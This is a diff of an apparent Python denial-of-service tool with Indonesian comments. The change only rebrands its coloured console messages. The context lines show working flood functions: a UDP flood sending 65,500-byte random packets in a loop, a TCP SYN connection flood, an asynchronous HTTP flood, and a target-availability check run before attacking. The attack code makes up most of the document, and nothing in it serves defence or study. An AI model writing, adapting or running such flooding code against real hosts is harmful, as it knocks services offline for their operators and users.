@@ -44,10 +44,10 @@ def check_target_availability(target_ip, target_port):
     # Memeriksa ketersediaan target sebelum memulai serangan.
     try:
         socket.create_connection((target_ip, target_port), timeout=5)
-        print(f"{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}Flood {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» Target available: {Fore.LIGHTGREEN_EX}{target_ip}:{target_port}")
+        print(f"{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTBLUE_EX}» Target available: {Fore.LIGHTGREEN_EX}{target_ip}:{target_port}")
         return True
     except socket.error:
-        print(f"{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}Flood {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» Target unavailable: {Fore.LIGHTRED_EX}{target_ip}:{target_port}")
+        print(f"{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTBLUE_EX}» Target unavailable: {Fore.LIGHTRED_EX}{target_ip}:{target_port}")
         return False
 
 def udp_attack(target_ip, target_port, duration): 
@@ -56,12 +56,12 @@ def udp_attack(target_ip, target_port, duration):
     packet_data = random._urandom(65500)
     end_time = time.time() + duration
     packets_sent = 0
-    print(f'{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}Flood {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» UDP attack has been launched on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}on {Fore.LIGHTGREEN_EX}{duration} {Fore.LIGHTBLUE_EX}seconds.')
+    print(f"{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTBLUE_EX}» UDP attack has been launched on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}on {Fore.LIGHTGREEN_EX}{duration} {Fore.LIGHTBLUE_EX}seconds.")
 
     while time.time() < end_time:
         udp_socket.sendto(packet_data, (target_ip, target_port))
         packets_sent += 1
-        print(f'{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}Flood {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» UDP attack completed. Total packets sent: {Fore.LIGHTGREEN_EX}{packets_sent}')
+        print(f"{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTBLUE_EX}» UDP attack completed. Total packets sent: {Fore.LIGHTGREEN_EX}{packets_sent}.")
 
 def tcp_syn_attack(target_ip, target_port, duration):
     # Memulai serangan TCP SYN pada target yang ditentukan.
@@ -77,7 +77,7 @@ def tcp_syn_attack(target_ip, target_port, duration):
             pass
         tcp_socket.close()
         packets_sent += 1
-        print(f'{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}Flood {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» TCP SYN attack completed. Total connection attempts: {Fore.LIGHTGREEN_EX}{packets_sent}')
+        print(f"{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTBLUE_EX}» TCP SYN attack completed. Total connection attempts: {Fore.LIGHTGREEN_EX}{packets_sent}.")
 
 async def http_flood_attack(target_ip, target_port, duration): 
     # Melakukan serangan HTTP Flood pada target yang ditentukan.
@@ -93,7 +93,7 @@ async def http_flood_attack(target_ip, target_port, duration):
             except aiohttp.ClientError:
                 pass
 
-    print(f'{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}Flood {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» HTTP Flood attack completed. Total requests sent: {Fore.LIGHTGREEN_EX}{requests_sent}')
+    print(f"{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTBLUE_EX}» HTTP Flood attack completed. Total requests sent: {Fore.LIGHTGREEN_EX}{requests_sent}.")
 
 if __name__ == "__main__":
     display_banner()
